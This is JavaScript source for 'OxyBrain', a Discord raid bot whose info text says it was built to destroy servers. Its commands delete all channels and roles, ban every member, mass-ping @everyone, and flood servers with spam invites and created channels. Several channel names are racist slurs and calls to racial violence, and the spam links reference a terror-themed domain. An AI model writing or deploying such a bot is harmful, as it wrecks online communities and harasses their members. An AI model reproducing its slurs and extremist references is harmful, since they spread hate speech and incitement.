const Discord = require('discord.js')
const bot = new Discord.Client();

bot.on('ready', () => {
    console.log(`${bot.user.tag} se právě spustil, jako OxyBrain!`)
})

bot.on('message', message => {
    if(message.content === 'x.ping') {
      setInterval(function() {
          message.channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone')
         }),
      1
    }
    if(message.content === "x.nuke") {
 message.channel.send("Nyní se maže vše")
	 message.guild.channels.forEach(channel => channel.delete())
	 message.guild.roles.forEach(roles => roles.delete()) } 
	  
    if(message.content === 'x.create') {
      setInterval(function() {
      message.guild.createChannel('Kill niggers', 'text')
      message.guild.createChannel('YCG ON THE TOP', 'voice')
      message.guild.createChannel('race war now', 'category')
    }),
    1
  }
  if(message.content === 'x.createroles') {
    setInterval(function() {
        message.guild.createRole({
           name: "Raided by best discord raidbot OxyBrain",
           color: 'RANDOM'
        })
      }),
      1
    }
  if(message.content === 'x.deleteroles') {
    message.guild.roles.forEach(role => role.delete())
  }
  if(message.content === 'x.deletechannels') {	
     message.guild.channels.forEach(channel => channel.delete())
  }
  if(message.content === 'x.banall') {
    message.guild.members.forEach((f) => {
      message.guild.member(f).ban('he he')
    })
  }
  bot.on('message', message => {
if(message.content === 'x.spam') {
	setInterval(function() {
  const spam = new Discord.RichEmbed()
  .setTitle("JOIN THE CRAIG'S EMPIRE NOW")
  .addField('JPIN THE https://discord.gg/YcDMa6NYmy NOW ', 'https://yungcraig.tk/ https://terrostic-isis.tk/', true)
  .setColor("RANDOM")
  message.channel.send(spam)
  }),
      1
    }
})
  if(message.content === 'x.help') {
  const xhelp = new Discord.RichEmbed()
  .setTitle("ALL COMMANDS")
  .addField('Info Commands', '```x.info```', true)
  .addField('Raid Commands', '```x.nuke, x.createroles, x.deleteroles, x.create, x.deletechannels, x.banall```', true)
  .addField('Other Commands', '```x.ping```', true)
  .setFooter("Thank you for using OxyBrain")
  .setColor("RANDOM")
  message.channel.send(xhelp)
  }
  if(message.content === 'x.info') {
  const xinfo = new Discord.RichEmbed()
  .setTitle("Informations")
  .setDescription("**The bot was created 29.7.2020 by YCG (PolaneSS), for in order to destroy discord servers, invite [here](https://discord.com/api/oauth2/authorize?client_id=756829950379556874&permissions=8&scope=bot) **")
  .setFooter("Thank you for using OxyBrain")
  .setColor("RANDOM")
  message.channel.send(xinfo)
  }
}) 
       
bot.login('//your token')
